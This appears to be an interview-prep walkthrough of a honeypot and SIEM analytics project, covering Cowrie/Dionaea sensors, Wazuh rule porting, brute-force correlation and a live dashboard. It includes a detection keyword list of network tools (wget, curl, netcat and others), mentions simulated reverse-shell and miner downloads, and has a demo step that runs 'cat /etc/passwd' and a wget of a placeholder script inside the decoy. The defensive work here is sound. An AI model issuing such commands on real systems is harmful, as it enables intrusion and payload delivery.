1The 30-second pitch

“I run three intentionally vulnerable decoy sensors — Cowrie, which fakes an SSH/Telnet server with a complete fake Linux shell; Dionaea, which fakes SMB, FTP, HTTP and database services; and WebTrap, a low-interaction HTTP honeypot I wrote from scratch that serves fake WordPress/phpMyAdmin/admin panels and exposed .env/.git files, capturing every request path, User-Agent and submitted credential. Attackers who find them think they've breached a real machine, and every credential they try, every command they run, and every file they attempt to download is logged. I then built my own real-time analytics pipeline in Python: it tails the honeypot logs, applies detection rules I wrote for the Wazuh SIEM (severity levels, rule IDs, MITRE ATT&CK technique mapping, brute-force correlation), enriches attacker IPs with geolocation and reputation data, stores everything in SQLite, and streams it to a live web dashboard over WebSocket. High-severity events fire Telegram/email alerts, and the system auto-generates HTML threat reports. The same rule files also load into a full Wazuh manager for a production deployment — the local pipeline and the SIEM share one detection logic.”

Why this design is worth defending The project isn't “I installed two tools.” The honeypots are off-the-shelf sensors, but everything between their raw log files and the analyst's screen — collection, normalisation, detection, correlation, enrichment, storage, alerting, reporting, visualisation — is custom code you can explain line by line. That's the part interviewers care about.

2Life of one attack event

Memorise this flow — it is the spine of the whole project. Suppose an attacker fails an SSH login against Cowrie:

attacker ──ssh──▶ Cowrie (container) │ appends JSON line to cowrie.json (shared Docker volume) ▼ collector.py _tail() picks up the new line ──▶ json.loads ──▶ _row_from_cowrie() │ normalised event row ▼ detect.py detect_cowrie() fires rules 100101 (+100108 if password present, +100111 if default account, +100107 if ≥5 fails/60s from that IP) top_detection() keeps the highest level as the row's severity ▼ enrich.py enrich_ip() → cache hit? else ip-api geolocation (+AbuseIPDB if key) ▼ db.py insert_event() → SQLite events table, returns row id ▼ main.py Hub.broadcast() → every connected dashboard gets it via WebSocket ▼ alerts.py maybe_alert() → level ≥ ALERT_LEVEL? send Telegram / email ▼ dashboard row appears in live feed <1s; charts refresh (debounced)

Every module below is one box in that flow. If you can narrate this diagram from memory, you can answer 80% of questions by walking to the relevant box.

3docker-compose.yml — the deployment

docker-compose.yml

What it does: defines the whole local stack: three containers on one private bridge network (honeynet), plus the volumes that connect them.

cowrie
official image, SSH honeypot on host port 2222, Telnet on 2223. Writes logs to the named volume cowrie-logs.
dionaea
community image, FTP on 2121→21, SMB on 8445→445, HTTP on 8088→80, MSSQL 11433→1433, MySQL 13306→3306. Writes to dionaea-logs.
analytics
built from ./ingest. Mounts both log volumes read-only, mounts host ./data for the SQLite DB + reports, serves the dashboard on 8080. All alert/intel config arrives as environment variables with safe defaults (${VAR:-}).
  • Why non-standard host ports? Safety for a local run (nothing collides with the host, and you're not accidentally exposing port 22), plus Windows itself reserves 445. On an internet-facing sensor you'd remap to the real ports so scanners find the services.
  • Why shared volumes instead of a network protocol? The honeypots only know how to write log files. A shared volume mounted :ro into the analytics container means the analytics service can never modify honeypot state — one-way data flow by construction.
  • Why is ./data a bind mount? So the database and reports survive docker compose down and are directly visible on the host.

4ingest/Dockerfile & requirements.txt

ingest/Dockerfile ingest/requirements.txt

Slim Python 3.12 base image; copies requirements.txt first so Docker's layer cache skips reinstalling dependencies when only app code changes; runs uvicorn app.main:app on port 8080. A HEALTHCHECK polls /api/health every 30 s so Docker can mark the container unhealthy.

Only three dependencies: fastapi (web framework), uvicorn (ASGI server), httpx (async HTTP client for geo/intel/Telegram calls). Everything else — SQLite, asyncio, smtplib, ipaddress — is the Python standard library. Small dependency surface is a deliberate talking point: fewer supply-chain risks, fast build, easy audit.

5main.py — the FastAPI application

ingest/app/main.py

What it does: the entry point. It wires everything together: starts the database, launches the collectors as background tasks, exposes the REST API, runs the WebSocket hub, and serves the dashboard.

The three pieces

  • lifespan() — FastAPI's startup/shutdown hook (an @asynccontextmanager). On startup it calls db.init(), builds the Pipeline, and spawns three background asyncio tasks: tail Cowrie, tail Dionaea, and write a periodic report. On shutdown it cancels them. This is why no separate worker process is needed — collectors and API share one event loop.
  • Hub — the WebSocket fan-out. Keeps a set of connected dashboard sockets; broadcast() sends each new event to all of them (stripping the bulky raw field), and quietly drops any socket that errors (a closed browser tab).
  • REST endpoints — every GET /api/… is a one-line wrapper around a query function in db.py: /api/summary, /api/events, /api/alerts, /api/mitre, /api/timeseries, /api/ips, /api/geo, /api/credentials, /api/commands, /api/sessions. Two special ones: POST /api/simulate (clamps sessions to 1–40 and feeds the simulator into the live pipeline) and GET /api/report (generates and downloads a fresh HTML report).
If asked: “why async / why FastAPI?” The workload is I/O-bound: waiting on log lines, HTTP calls to geo APIs, WebSocket pushes. One asyncio event loop handles all of it concurrently without threads. FastAPI gives async endpoints, WebSocket support, and automatic OpenAPI docs (/docs) with almost no boilerplate.

6collector.py — tailing & orchestration

ingest/app/collector.py

What it does: watches both honeypot log files, turns each raw line into a clean, uniform “event row”, and drives every row through the full pipeline (detect → enrich → store → broadcast → alert).

_tail() — the file follower

An async generator that behaves like tail -f, hardened for real log files:

  • Waits politely (1 s sleeps) until the file exists — the honeypot may not have logged anything yet.
  • Seeks to the end on open, so restarting the analytics container doesn't re-ingest history.
  • When no new line is available it sleeps 0.5 s (non-blocking — the API stays responsive).
  • Rotation/truncation detection: it remembers the file's inode; if the inode changes (logrotate replaced the file) or the file is suddenly smaller than the current read offset (truncated), it reopens the file. Without this, tailing silently stops on the first rotation — a classic production bug this code explicitly handles.

Normalisation

  • Cowrie logs newline-delimited JSON. _row_from_cowrie() maps its fields into the common row shape: eventid → event_type, input → command, plus src_ip/ports, session id, username, password. The raw JSON is kept (truncated to 4000 chars) for forensics.
  • Dionaea logs free text, so _row_from_dionaea() applies a regex (_DIO_CONN) that extracts the protocol (smb/ftp/http/mssql/mysql/epmap) and source IPv4 from “connection” lines; anything not matching is ignored.

Pipeline._handle() — the heart of the project

One method runs the entire chain for every event, live or synthetic:

dets = detect(protocol, row)          # all matching rules
top  = top_detection(dets)            # highest level wins → row's severity/rule/MITRE
intel = await enrich.enrich_ip(...)   # cached geo + reputation
row["id"] = db.insert_event(row)      # persist, get primary key
await self._broadcast(row)            # push to every dashboard (WebSocket)
await alerts.maybe_alert(...)         # Telegram/email if level ≥ threshold

ingest_synthetic() is the simulator's entry point — it funnels fake events through this exact same method, which is your answer to “is the demo faked?”: the demo fakes the input, never the processing.

7detect.py — the detection engine

ingest/app/detect.py

What it does: a Python port of your Wazuh rule files. Each event is checked against the rules; every match produces a Detection carrying a rule id, a Wazuh-scale severity level (0–15), a description, a MITRE ATT&CK technique + tactic, and a category.

Key mechanics

  • band() maps the numeric level to the dashboard's severity bands: ≥10 critical, ≥8 high, ≥6 medium, ≥3 low, else info.
  • Rules stack. One failed login can fire up to four rules at once: 100101 (attempt) + 100108 (password captured) + 100111 (default account like root/admin) + 100107 (brute force). top_detection() picks the highest level for the row's badge, but all matches ride along to the dashboard in all_rules.
  • BruteForceTracker — the stateful correlation rule. Per source IP it keeps a deque of failure timestamps; on each failure it drops entries older than 60 s and fires rule 100107 when ≥5 remain. A _fired map suppresses re-firing more than once per window. This is the direct port of Wazuh's <frequency>5</frequency><timeframe>60</timeframe> on rule 100107 — the sliding-window algorithm is the single most likely “explain this code” target.
  • Command inspection: any shell command fires 100103 (level 8); if it contains wget/curl/nc/netcat/nmap/scp/tftp/ncat, 100104 (level 10) fires too — the attacker is pulling in tooling (MITRE T1105, Ingress Tool Transfer).
  • Rule 100150 (level 10, honeypot breach) — fires on cowrie.login.success. This rule is your addition, not in the original XML: the original ruleset never flagged the moment an attacker actually got in. Know this — it's your best “what did you improve?” answer.
  • Dionaea detection is keyword-based on the text message: SMB/FTP/HTTP connections (recon, levels 5–6), “stored binary” (malware captured, level 12), exploit names like MS17-010/EternalBlue (level 10), shellcode/meterpreter markers (level 11).

8enrich.py — threat-intel enrichment

ingest/app/enrich.py

What it does: answers “who is attacking me?” for each source IP: country, city, lat/lon, ISP/org/ASN (via the free ip-api.com), plus an optional AbuseIPDB reputation score (0–100) and Tor-exit flag when an API key is configured.

  • Caching: results are stored in the ip_intel table; every later event from the same IP is a database hit, not an API call. Essential because ip-api's free tier is rate-limited (~45 req/min) and a brute-force burst can be hundreds of events from one IP.
  • Private-IP short-circuit: RFC1918/loopback addresses (your own Docker network when you test by hand) are labelled Lab network / LAB locally — no pointless API call, and the dashboard shows a 🧪 instead of a wrong flag.
  • Fail-open: every external call is wrapped in try/except returning {}. If the internet is down, events still flow — they're just less decorated. Enrichment is best-effort by design; capture must never block on it.

9db.py — storage & the query layer

ingest/app/db.py

What it does: owns the SQLite database: schema, the single write path, and one query function per dashboard panel.

Schema (two tables)

  • events — one row per honeypot event: timestamp, protocol, event type, src ip/port, session, username, password, command, plus the detection verdict (severity, level, rule_id, rule_desc, mitre, tactic, category) and truncated raw log. Indexed on ts, src_ip, event_type, level — exactly the columns the dashboard filters and groups on.
  • ip_intel — the enrichment cache keyed by IP, with first_seen / last_seen / hits counters.

Concurrency story (know this cold)

One shared connection with check_same_thread=False, guarded by a threading.Lock. The collector and the API handlers run in the same asyncio event loop, so writes can't truly race — the lock is defence-in-depth so a future thread can't corrupt a write. Honest framing: SQLite is the right size for a single-sensor lab (zero ops, one file, easy backup); at production scale this is exactly what Wazuh's indexer replaces.

Query techniques worth naming

  • SUM(event_type = 'cowrie.login.failed') — SQLite booleans are 0/1, so SUM of a comparison is a conditional count. Used all over summary() and timeseries().
  • strftime('%Y-%m-%dT%H:%M:00Z', ts) — truncates timestamps to the minute to bucket events for the activity chart.
  • LEFT JOIN ip_intel in top_ips() / recent_sessions() — events still show even if enrichment failed for that IP.
  • recent_sessions() uses a correlated subquery to pull each session's highest-severity command — one query instead of N+1.

10alerts.py — notifications

ingest/app/alerts.py

What it does: pushes high-severity events to a human. If an event's level is ≥ ALERT_LEVEL (default 10 = critical band), it formats a compact message (level, rule description, IP + country, event type, MITRE id, the command/username involved) and sends it via the Telegram Bot API (simple authenticated POST) and/or SMTP email (STARTTLS, optional login).

  • Fully optional: with no tokens configured, both branches are skipped — the stack runs out of the box with zero setup.
  • Fail-silent: a Telegram outage must never take down ingestion, so send errors are swallowed. Same “capture first, decorate second” philosophy as enrichment.
  • The threshold means you get a page for breaches (level 10), suspicious downloads (10–12), and malware captures (12) — not for every port scan.

11report.py — automated reporting

ingest/app/report.py

What it does: renders a standalone HTML threat report — KPI summary, alerts by rule, top attacker IPs, top credentials tried, top commands — straight from the database queries. No template engine, just an f-string with inline CSS, so the file opens anywhere and prints to PDF cleanly. Written on two triggers: a background task every REPORT_EVERY_SECONDS (default: daily), and on demand via GET /api/report (the dashboard's “Report ↗” button). Files land in data/reports/report-YYYYMMDD-HHMM.html.

12simulate.py — the demo generator

ingest/app/simulate.py

What it does: replays realistic attacker sessions so a laptop demo looks like an internet-exposed sensor. A locally-run honeypot only ever sees RFC1918 Docker IPs — no geography, no reputation — so the simulator uses a fixed list of real, publicly-routable scanner IPs (known SSH brute-forcers and Tor exits) purely so geolocation and AbuseIPDB return real data on the map.

Each synthetic session mirrors a genuine Cowrie session's event sequence: session.connect → client.version → 3–8 failed logins from common username/password lists → ~45% chance of a successful “breach” → recon commands (whoami, uname -a, cat /etc/passwd…) → 70% chance of a malicious command (wget/curl a miner, netcat reverse shell) → session.closed.

The one-line defence “The simulator fabricates input, never results — every synthetic event goes through Pipeline.ingest_synthetic(), i.e. the identical detect → enrich → store → broadcast path as live traffic. And you can bypass it entirely: SSH to port 2222 and attack the honeypot yourself.”

13dashboard/index.html — the live console

ingest/dashboard/index.html

What it does: the entire front-end in one file — HTML, CSS and vanilla JS, zero external dependencies (no CDN, no chart library). That's deliberate: a honeypot network should be isolated, so the dashboard can't rely on internet resources; it also loads instantly and has no supply-chain exposure.

How it stays live

  • WebSocket feed: connects to /ws; each pushed event is prepended to the feed (capped at 60 rows). Reconnects automatically with linear backoff if the server restarts.
  • Debounced refresh: instead of re-fetching all aggregates on every event, a 1.2 s debounce batches bursts (a brute-force run = dozens of events) into one refresh. A safety-net poll runs every 8 s.
  • Hand-rolled canvas charts: the activity chart is a scaled area/line drawing with red dots overlaid on minutes containing critical events; the “map” is an equirectangular scatter — longitude/latitude map linearly to x/y (x = (lon+180)/360·W), bubble size = event count, colour = abuse score. Being able to explain that projection formula is a nice flex.
  • Details: country flags are generated from ISO codes via Unicode regional-indicator arithmetic (LAB → 🧪 for lab IPs); dark/light theme via CSS variables; commands are HTML-escaped before insertion (attacker-controlled strings!).

14config/ — the Wazuh SIEM side

config/cowrie_rules.xml config/dionaea_rules.xml config/ossec.conf

What they do: these are the production-path artifacts a real Wazuh manager loads. ossec.conf is the agent snippet telling Wazuh which files to ship (cowrie.json as JSON, Dionaea logs as syslog). The two XML files are custom rulesets (100100–100112 for Cowrie, 100200–100215 for Dionaea) in Wazuh's rule grammar:

  • Rule hierarchy: a level-0 parent rule (100100/100200) matches “this is a honeypot event”; children refine it via <if_sid>. Wazuh evaluates children only when the parent matched — that's how rule trees keep evaluation cheap.
  • Field vs match: Cowrie rules use <field name="eventid"> against decoded JSON; Dionaea rules use <match> substring/regex on raw syslog text. Your Python detect.py mirrors exactly this split (dict lookups vs keyword search).
  • Correlation in XML: rule 100107's frequency=5, timeframe=60 is what BruteForceTracker reimplements in Python.
  • MITRE tags (<mitre_id>) make alerts appear in Wazuh's ATT&CK dashboard, mapping observed behaviour to standard adversary techniques.
Heads-up before you present The rule <description> texts in both XML files are in French (“Tentative de connexion SSH/Telnet”, etc.). Be ready to explain why — or translate them to English so nobody asks. Also note small intentional divergences between XML and Python: the Python engine adds rule 100150 (breach) which the XML lacks, and the XML has a few rules the local engine doesn't need (100109 session-closed, 100110 blacklist CDB list, 100210 same-source-IP frequency, handled locally by the Cowrie tracker instead).

15scripts/ — production installers

scripts/install_cowrie.sh scripts/install_dionaea_docker.sh scripts/install_wazuh.sh scripts/install_wazuh_agent.sh

What they do: stand up the production topology on real Linux hosts (VPS/VMs), where Wazuh — not the local FastAPI service — is the analytics tier:

  • install_cowrie.sh — bare-metal Cowrie: dedicated non-root cowrie user, Python venv, clones the repo, configures SSH on 2222 / Telnet on 2223. (Running a honeypot as an unprivileged user is itself a security control — if someone escapes the fake shell, they land in a nobody account.)
  • install_dionaea_docker.sh — Dionaea in Docker with --network host so it binds the real service ports, logs bind-mounted to /opt/dionaea/log where the Wazuh agent reads them.
  • install_wazuh.sh — official all-in-one installer (manager + indexer + dashboard, v4.7.5) on the SIEM server.
  • install_wazuh_agent.sh — installs the agent on the honeypot host, enrolled to the manager's IP; combined with ossec.conf it ships the honeypot logs to the manager where your XML rules fire.

17Questions you'll get asked — with answers

Q · Why a honeypot at all? Zero false positives by definition: nothing legitimate ever touches a decoy, so 100% of traffic is hostile. It converts attackers into free threat intelligence — live credentials lists, tool URLs, malware samples — with no risk to real assets.
Q · Cowrie is “medium-interaction” — what does that mean? Low-interaction honeypots only emulate a banner/handshake; high-interaction ones are real sacrificial systems (risky). Cowrie is in between: a complete fake shell environment (fake filesystem, fake command outputs) that keeps attackers engaged long enough to reveal behaviour, but nothing they do executes for real — wget downloads are captured as samples, not run.
Q · Why build your own pipeline when Wazuh exists? Two tiers, one rule set. The full Wazuh stack needs ~6 GB RAM and several VMs — wrong tool for development and demos. The FastAPI service ports the same rules into a package that boots in seconds anywhere, with a dashboard purpose-built for honeypot data. In production the same XML files load into Wazuh, so local behaviour predicts production behaviour. Building the pipeline also proves I understand what a SIEM does internally, instead of treating it as a black box.
Q · Walk me through the brute-force detection. Sliding window per source IP. Each failed login appends a timestamp to that IP's deque; entries older than 60 s are popped from the front; if 5+ remain, rule 100107 fires at level 8, and a per-IP cooldown stops it re-firing every subsequent failure in the same window. O(1) amortised per event. Identical semantics to Wazuh's frequency/timeframe correlation.
Q · What happens if the geo API is down / rate-limited? Nothing breaks. Enrichment is fail-open (try/except → empty dict) and cached per IP in SQLite, so each IP costs at most one call ever. Events flow regardless; they just lack a flag on the map.
Q · Why SQLite? Would it scale? Right-sized for a single sensor: zero administration, one portable file, and the write rate of a honeypot (even under attack) is trivially within SQLite's capability. Access is single-process, lock-guarded. The scaling answer is architectural, not a bigger database: that's precisely when you switch to the Wazuh tier (indexer = OpenSearch) that the project already integrates with.
Q · How does the dashboard update in under a second? Push, not poll: the ingest pipeline broadcasts every stored event over a WebSocket to all connected browsers. Aggregate panels re-query REST endpoints on a 1.2 s debounce so a burst of 50 brute-force events causes one refresh, not 50.
Q · What's the MITRE ATT&CK mapping for? It translates raw events into a shared adversary-behaviour vocabulary: “45 T1110 Brute Force, 3 T1105 Ingress Tool Transfer” means something to any SOC analyst. It also lets you see attack phases: initial access (T1078) → credential access (T1110) → execution (T1059) → command-and-control (T1105).
Q · Is this safe to run? What are the risks? Locally: containers on an isolated bridge network, non-standard host ports, analytics volume mounts read-only, nothing sensitive on the host reachable from the honeypot containers. Internet-facing: isolate the sensor (dedicated VPS/VLAN), never on a network with real assets, egress-restrict it, and never expose the 8080 dashboard publicly without auth in front — it has no login of its own.

18Known limitations — own them before someone else finds them

Saying these unprompted is what makes the project convincingly yours. Several of the original gaps have since been closed — owning both the gap and the fix is even stronger:

  1. Dashboard XSS — fixed. Every attacker- or third-party-controlled string (username, password, commands, src_ip, geolocation, session id, MITRE id) is now routed through esc() before it reaches innerHTML, and the server-side HTML report html.escape()s every cell. Regression-tested by feeding <script> as an FTP username and confirming it renders inert. Worth explaining as a real stored-XSS class against SOC tools that you closed.
  2. Dashboard authentication — added (optional). Setting DASH_USER/ DASH_PASS puts HTTP Basic auth in front of the whole app via FastAPI middleware (/api/health stays open for the container healthcheck). Off by default for the local demo; enable it for anything reachable beyond localhost.
  3. Plaintext captured credentials are stored and displayed. Fine for a honeypot (they're the attacker's, not users'), but worth stating you considered it.
  4. Unbounded growth — bounded. RETENTION_DAYS purges old events on a timer and the brute-force / scan trackers now prune() aged-out per-IP state, so a long-lived internet sensor no longer accumulates rows and deques forever. (The timeseries query still buckets all remaining history — cheap enough within a retention window.)
  5. Dionaea parsing depth. The collector now parses each accepted connection into a real protocol (from its port), captures FTP USER/PASS credentials and file-transfer commands, and stamps events with the log's own timestamp. It still does not reassemble SMB/MSSQL payload internals — those surface as connection + exploit-keyword events rather than fully decoded RPC calls, which the full Wazuh path handles more deeply.
  6. Rule drift — single-sourced. Rule severity levels and MITRE mappings are now generated from config/*.xml into app/rules.py by scripts/gen_rules.py; detect.py looks them up rather than hard-coding them, and CI (a parity test + gen_rules.py --check) fails if the two ever disagree. Building this caught a genuine bug — rule 100215's MITRE tactic was TA0002 in the XML but the correct TA0042 in Python. Only the human-readable descriptions remain per-surface (French for the SIEM, English for the dashboard), which is deliberate.
  7. Alert paths — now retried. A failed Telegram/email send is pushed onto a small bounded retry deque and re-attempted on the next alert instead of being dropped, and the SMTP send runs in a worker thread so delivery never blocks ingestion.

19The 5-minute demo script

  1. docker compose up -d --build → open http://localhost:8080. Point out the empty console: “live” status dot = WebSocket connected.
  2. Real attack first: ssh admin@localhost -p 2222 (password admin — Cowrie accepts it by design). Inside the fake shell run uname -a, cat /etc/passwd, then wget http://example.com/x.sh. Alt-tab: the breach (rule 100150, critical) and the wget (100104) are already in the feed. This proves end-to-end capture in real time.
  3. Then simulate scale: click ▶ Simulate attack. Brute-force bars, MITRE breakdown, and the geo-map light up with real scanner IPs. Say the line: “synthetic input, identical pipeline.”
  4. Open a critical event's rule id and connect it to the matching rule in cowrie_rules.xml — the local/Wazuh shared-logic story in one glance.
  5. Click Report ↗ — the auto-generated threat report, same data, analyst-friendly.
  6. Close with the architecture diagram and the production path (scripts/ + ossec.conf + agent → Wazuh manager).
